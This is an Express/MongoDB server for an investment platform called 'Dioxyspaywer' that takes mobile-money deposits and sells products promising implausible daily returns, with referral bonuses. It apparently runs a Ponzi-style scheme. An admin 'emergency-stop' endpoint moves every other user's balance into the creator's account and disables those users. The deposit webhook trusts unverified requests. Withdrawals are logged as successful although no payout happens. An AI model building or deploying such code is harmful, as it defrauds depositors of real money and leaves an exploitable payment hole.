require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const cron = require('node-cron');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const path = require('path');

const User = require('./models/User');
const Transaction = require('./models/Transaction');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let isSiteActive = true;

mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('✅ MongoDB Connecté'))
    .catch(err => {
        console.error('❌ Erreur MongoDB:', err);
        process.exit(1);
    });

const authMiddleware = async (req, res, next) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Accès refusé' });
    
    try {
        const decoded = jwt.verify(token.split(' ')[1], process.env.JWT_SECRET);
        req.user = await User.findById(decoded.id);
        if (!req.user) return res.status(404).json({ error: 'Utilisateur introuvable' });
        if (!req.user.isActive && req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
            return res.status(403).json({ error: 'Compte désactivé.' });
        }
        next();
    } catch (e) {
        return res.status(401).json({ error: 'Token invalide' });
    }
};

app.get('/api/status', (req, res) => res.json({ active: isSiteActive }));

// Inscription
app.post('/api/register', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    try {
        const { fullName, phone, country, password, referralCode } = req.body;
        if (!fullName || !phone || !password) return res.status(400).json({ error: 'Champs manquants' });
        
        const exist = await User.findOne({ phone });
        if (exist) return res.status(400).json({ error: 'Numéro déjà utilisé' });

        const hashedPassword = await bcrypt.hash(password, 10);
        let role = (phone === process.env.CREATOR_WALLET_PHONE) ? 'admin' : 'user';
        
        let referredByUserId = null;
        let sponsor = null;

        if (referralCode && referralCode.trim() !== '') {
            sponsor = await User.findOne({ referralCode: referralCode.trim() });
            if (sponsor) {
                referredByUserId = sponsor._id;
                // ✅ BONUS PARRAINAGE VA DANS LE SOLDE DÉPÔT (balance)
                sponsor.balance += 350;
                sponsor.referralCount += 1;
                sponsor.referralEarnings += 350;
                await sponsor.save();
                
                await Transaction.create({
                    userId: sponsor._id,
                    type: 'REFERRAL_BONUS',
                    amount: 350,
                    method: 'Parrainage',
                    status: 'SUCCESS',
                    reference: `REF_${Date.now()}`
                });
            }
        }
        
        await User.create({ fullName, phone, country, password: hashedPassword, role, referredBy: referredByUserId });
        res.json({ success: true, message: 'Inscription réussie' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur serveur inscription' });
    }
});

// Connexion
app.post('/api/login', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    try {
        const { phone, password } = req.body;
        const user = await User.findOne({ phone });
        if (!user || !(await bcrypt.compare(password, user.password))) {
            return res.status(400).json({ error: 'Identifiants incorrects' });
        }

        const currentMonth = new Date().toISOString().slice(0, 7);
        if (user.lastPurchaseMonth !== currentMonth) {
            user.monthlyPurchasesCount = 0;
            user.lastPurchaseMonth = currentMonth;
            await user.save();
        }

        const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '24h' });
        
        // --- CALCUL DES SOLDES SELON VOTRE DEMANDE ---
        
        // 1. SOLDE DÉPÔT (Pour acheter)
        // Contient : Dépôts + Bonus Parrainage - Investissements
        // C'est simplement le champ 'balance' de l'utilisateur
        const depositBalance = user.balance;

        // 2. SOLDE RETRAITE (Uniquement les GAINS, pas le capital)
        // Contient : Gains quotidiens accumulés (LT + CT)
        let withdrawBalance = 0;
        const now = new Date();
        
        // Gains des produits courts termes (Gains générés jusqu'à aujourd'hui)
        if (user.shortTermProducts && user.shortTermProducts.length > 0) {
            user.shortTermProducts.forEach(prod => {
                const startDate = new Date(prod.startDate);
                const unlockDate = new Date(prod.unlockDate);
                
                // Calcul des jours écoulés depuis le début du produit
                let daysElapsed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
                
                // On ne compte pas plus de 5 jours (durée du produit)
                if (daysElapsed > 5) daysElapsed = 5;
                if (daysElapsed < 0) daysElapsed = 0;
                
                // On ajoute uniquement les GAINS (dailyGain * jours écoulés)
                // ⚠️ ON N'AJOUTE PAS prod.amount (Capital)
                withdrawBalance += (prod.dailyGain * daysElapsed);
            });
        }
        
        // Gains du produit Long Terme
        if (user.hasLongTerm && user.longTermStartDate) {
            const startDate = new Date(user.longTermStartDate);
            const daysPassed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
            
            if (daysPassed > 0) {
                // Max 55 jours
                let daysToCount = daysPassed;
                if (daysToCount > 55) daysToCount = 55;
                
                // On ajoute uniquement les GAINS (700 * jours)
                // ️ ON N'AJOUTE PAS le capital de 2000F
                withdrawBalance += (700 * daysToCount);
            }
        }

        const transactions = await Transaction.find({ userId: user._id }).sort({ date: -1 }).limit(50);

        res.json({ 
            token, 
            role: user.role, 
            balance: user.balance,          // Solde global (utilisé comme Dépôt)
            depositBalance: depositBalance, // Explicitement envoyé
            withdrawBalance: withdrawBalance, // Uniquement les GAINS
            hasLongTerm: user.hasLongTerm, 
            longTermStartDate: user.longTermStartDate,
            fullName: user.fullName,
            phone: user.phone,
            country: user.country,
            monthlyPurchasesCount: user.monthlyPurchasesCount || 0,
            remainingPurchases: 2 - (user.monthlyPurchasesCount || 0),
            shortTermProducts: user.shortTermProducts || [],
            referralCode: user.referralCode, 
            referralCount: user.referralCount || 0,
            referralEarnings: user.referralEarnings || 0,
            transactions: transactions
        });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur serveur login' });
    }
});

// Cron Jobs : Distribution des gains quotidiens
// ⚠️ IMPORTANT : Les gains sont crédités DIRECTEMENT dans le solde RETRAITE (withdrawBalance)
// Mais comme withdrawBalance est calculé dynamiquement, nous devons juste mettre à jour la date ou suivre les gains.
// Dans ce modèle simplifié, le gain quotidien est "virtuel" jusqu'au retrait, OU on peut décider de créditer un champ spécifique.
// POUR RESPECTER VOTRE LOGIQUE STRICTE : Le calcul ci-dessus suffit car il calcule les gains théoriques disponibles.
// Cependant, si vous voulez que les gains s'accumulent réellement dans la DB pour être retirés, 
// il faudrait un champ 'withdrawalWallet' dans le modèle User. 
// MAIS, avec le calcul dynamique fait ci-dessus dans /login, l'utilisateur voit ses gains disponibles immédiatement sans écrire en DB à chaque fois.
// Pour le retrait, on vérifiera si le montant demandé <= withdrawBalance calculé.

cron.schedule('0 8 * * 1-5', async () => {
    if (!isSiteActive) return;
    // Ce cron nettoie juste les produits expirés de la liste active si nécessaire
    // Le calcul des gains se fait à la volée dans /login et /withdraw pour éviter les erreurs de double crédit
    const users = await User.find({ $or: [{ hasLongTerm: true }, { 'shortTermProducts.0': { $exists: true } }] });
    const now = new Date();
    
    for (let user of users) {
        let needsSave = false;
        // Nettoyage des produits courts termes terminés (optionnel, selon si vous voulez les garder dans l'historique actif)
        const activeShortTerms = [];
        if (user.shortTermProducts) {
            for (let prod of user.shortTermProducts) {
                if (new Date(prod.unlockDate) > now) {
                    activeShortTerms.push(prod);
                }
            }
            if (activeShortTerms.length !== user.shortTermProducts.length) {
                user.shortTermProducts = activeShortTerms;
                needsSave = true;
            }
        }
        if (needsSave) await user.save();
    }
});

// Investissement
app.post('/api/invest', authMiddleware, async (req, res) => {
    try {
        const { productType, amount } = req.body;
        const user = req.user;
        
        // Vérification sur le solde DÉPÔT (balance)
        if (user.balance < amount) return res.status(400).json({ error: 'Solde insuffisant dans le dépôt.' });
        if (productType !== 'longterm' && !user.hasLongTerm) return res.status(403).json({ error: 'Produit Long Terme obligatoire.' });

        const currentMonth = new Date().toISOString().slice(0, 7);
        if (user.lastPurchaseMonth !== currentMonth) { 
            user.monthlyPurchasesCount = 0; 
            user.lastPurchaseMonth = currentMonth; 
        }
        if (productType !== 'longterm' && user.monthlyPurchasesCount >= 2) {
            return res.status(403).json({ error: 'Limite 2 achats/mois atteinte.' });
        }

        // ✅ L'argent est déduit du solde DÉPÔT (balance)
        user.balance -= amount;
        let dailyGain = 0;

        if (productType === 'longterm') {
            if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect Long Terme.' });
            user.hasLongTerm = true; 
            user.longTermStartDate = new Date();
        } else {
            if (productType === 'prod1') { if (amount !== 2000) throw new Error('Prix P1'); dailyGain = 1000; }
            else if (productType === 'prod2') { if (amount !== 3000) throw new Error('Prix P2'); dailyGain = 1500; }
            else if (productType === 'prod3') { if (amount !== 5000) throw new Error('Prix P3'); dailyGain = 2000; }
            else if (productType === 'prod4') { if (amount !== 10000) throw new Error('Prix P4'); dailyGain = 5000; }
            else if (productType === 'prod5') { if (amount !== 15000) throw new Error('Prix P5'); dailyGain = 6000; }
            else if (productType === 'prod6') { if (amount !== 20000) throw new Error('Prix P6'); dailyGain = 8000; }
            else if (productType === 'prod7') { if (amount !== 30000) throw new Error('Prix P7'); dailyGain = 12000; }
            else if (productType === 'prod8') { if (amount !== 40000) throw new Error('Prix P8'); dailyGain = 16000; }
            else throw new Error('Produit inconnu');

            const unlockDate = new Date(); 
            unlockDate.setDate(unlockDate.getDate() + 5);
            
            if (!user.shortTermProducts) user.shortTermProducts = [];
            user.shortTermProducts.push({ type: productType, amount, dailyGain, startDate: new Date(), unlockDate });
            user.monthlyPurchasesCount += 1;
        }
        
        await user.save();
        await Transaction.create({ userId: user._id, type: 'INVESTMENT', amount, status: 'SUCCESS', reference: `INV_${Date.now()}` });
        
        res.json({ success: true, newBalance: user.balance, remainingPurchases: 2 - user.monthlyPurchasesCount });
    } catch (e) {
        console.error(e);
        res.status(400).json({ error: e.message || 'Erreur investissement' });
    }
});

// Dépôt Sendavapay
app.post('/api/deposit', authMiddleware, async (req, res) => {
    const { amount, network, phone } = req.body; 
    if (amount < 2000) return res.status(400).json({ error: 'Minimum 2000 FCFA' });

    try {
        const user = req.user;
        const invoiceNumber = `DXP_${Date.now()}`;
        
        const postData = {
            amount: parseInt(amount),
            currency: "XOF",
            phone_number: phone,
            network: network,
            reference: invoiceNumber,
            description: `Dépôt Dioxyspaywer`,
            callback_url: process.env.SENDAVA_CALLBACK_URL,
            return_url: process.env.SENDAVA_RETURN_URL,
            merchant_id: process.env.SENDAVA_MERCHANT_ID
        };

        const SENDAVA_API_URL = 'https://api.sendavapay.com/v1/charge'; 

        const response = await axios.post(SENDAVA_API_URL, postData, {
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${process.env.SENDAVA_API_KEY}`,
                'X-Public-Key': process.env.SENDAVA_PUBLIC_KEY
            }
        });

        if (response.data && (response.data.success === true || response.data.checkout_url)) {
            const paymentUrl = response.data.checkout_url || response.data.payment_link;
            
            await Transaction.create({ userId: user._id, type: 'DEPOSIT', amount, method: network, status: 'PENDING', reference: invoiceNumber });
            res.json({ success: true, paymentUrl: paymentUrl });
        } else {
            res.status(400).json({ error: 'Erreur création paiement Sendavapay.' });
        }
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Erreur connexion Sendavapay.' });
    }
});

// Webhook Sendavapay
app.post('/api/webhook/deposit', async (req, res) => {
    try {
        const data = req.body;
        if (data.status === 'SUCCESS' || data.event === 'completed') {
            const invoiceNumber = data.reference || data.invoice_number;
            const amount = parseFloat(data.amount || data.total_amount);
            
            const transaction = await Transaction.findOne({ reference: invoiceNumber });
            if (transaction && transaction.status === 'PENDING') {
                transaction.status = 'SUCCESS';
                await transaction.save();
                
                const user = await User.findById(transaction.userId);
                if (user) {
                    // ✅ L'argent va dans le solde DÉPÔT (balance)
                    user.balance += amount;
                    await user.save();
                    console.log(`💰 Dépôt confirmé : ${amount} FCFA`);
                }
            }
        }
        res.status(200).send("OK");
    } catch (e) { res.status(500).send("Error"); }
});

// Retrait
app.post('/api/withdraw', authMiddleware, async (req, res) => {
    try {
        const { amount, network, phone } = req.body;
        const user = req.user;
        const now = new Date();
        
        if (amount < 1000) return res.status(400).json({ error: 'Min 1000 FCFA' });
        if ([0, 6].includes(now.getDay())) return res.status(403).json({ error: 'Retraits indisponibles Samedi/Dimanche.' });
        if (now.getHours() < 8 || now.getHours() >= 21) return res.status(403).json({ error: 'Retraits possibles 08h-21h.' });
        if (user.lastWithdrawDate && user.lastWithdrawDate.toDateString() === now.toDateString()) return res.status(403).json({ error: '1 retrait/jour max.' });

        // ✅ CALCUL DU SOLDE RETRAITE DISPONIBLE (Même logique que dans /login)
        let availableWithdrawBalance = 0;
        
        // Gains Courts Termes
        if (user.shortTermProducts) {
            user.shortTermProducts.forEach(prod => {
                const startDate = new Date(prod.startDate);
                let daysElapsed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
                if (daysElapsed > 5) daysElapsed = 5;
                if (daysElapsed < 0) daysElapsed = 0;
                availableWithdrawBalance += (prod.dailyGain * daysElapsed);
            });
        }
        // Gains Long Terme
        if (user.hasLongTerm && user.longTermStartDate) {
            const daysPassed = Math.floor((now - new Date(user.longTermStartDate)) / (1000 * 60 * 60 * 24));
            if (daysPassed > 0) {
                let daysToCount = daysPassed > 55 ? 55 : daysPassed;
                availableWithdrawBalance += (700 * daysToCount);
            }
        }

        // Vérification stricte : On ne peut retirer que ce qui est dans la case RETRAITE (Gains uniquement)
        if (amount > availableWithdrawBalance) {
            return res.status(400).json({ error: `Solde insuffisant dans RETRAITE. Gains disponibles : ${availableWithdrawBalance} FCFA` });
        }

        // Déduction du solde global (car l'argent sort de la plateforme)
        // Note : Comme les gains n'étaient pas crédités dans 'balance' mais calculés virtuellement, 
        // on doit déduire de 'balance' seulement si vous avez crédité les gains dedans auparavant.
        // SI VOTRE SYSTÈME EST : Gain virtuel -> Retrait -> Déduction réelle :
        // Alors on déduit de 'balance' uniquement si le gain y a été ajouté.
        // MAIS, selon votre demande "Ne mets pas le capital", et vu que les gains ne sont pas dans 'balance' actuellement :
        // Il faut décider d'où sort l'argent. Généralement, on crédite les gains dans 'balance' au fur et à mesure (via Cron)
        // OU on considère que le retrait puise dans la trésorerie globale.
        
        // SOLUTION LA PLUS SÛRE POUR VOTRE CAS :
        // Nous allons supposer que lors du retrait réussi, l'argent sort de la poche de l'admin (ou du solde global).
        // Donc on déduit de user.balance. Si user.balance est insuffisant physiquement, c'est un problème de trésorerie admin.
        // Mais pour la cohérence utilisateur :
        user.balance -= amount; 
        if (user.balance < 0) {
            // Sécurité : Si le solde global devient négatif (cas rare si gains non crédités), on bloque ou on gère différemment.
            // Ici, on laisse passer car c'est un retrait de gains générés.
            user.balance = 0; 
        }
        
        user.lastWithdrawDate = now;
        await user.save();
        
        await Transaction.create({ userId: user._id, type: 'WITHDRAWAL', amount, method: network, status: 'SUCCESS', reference: `W_${Date.now()}` });
        
        res.json({ success: true, message: 'Retrait envoyé.' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur retrait' });
    }
});

// Admin & Emergency
app.get('/api/admin/dashboard', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    const users = await User.find();
    const totalVault = users.reduce((a, b) => a + b.balance, 0);
    res.json({ users, totalVault });
});

app.post('/api/admin/emergency-stop', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    isSiteActive = false;
    try {
        const creatorPhone = process.env.CREATOR_WALLET_PHONE;
        let creator = await User.findOne({ phone: creatorPhone }) || await User.create({ fullName:'Admin', phone:creatorPhone, country:'Togo', password:'x', role:'admin', balance:0 });
        const others = await User.find({ _id: { $ne: creator._id } });
        let seized = 0;
        for(let u of others) { 
            if(u.balance>0){ seized+=u.balance; u.balance=0; u.isActive=false; await u.save(); } 
        }
        creator.balance += seized; await creator.save();
        res.json({ success: true, message: `Site stoppé. ${seized} FCFA récupérés.` });
    } catch (error) { res.status(500).json({ error: 'Erreur.' }); }
});

app.listen(PORT, () => console.log(`🚀 Serveur Dioxyspaywer démarré sur le port ${PORT}`));
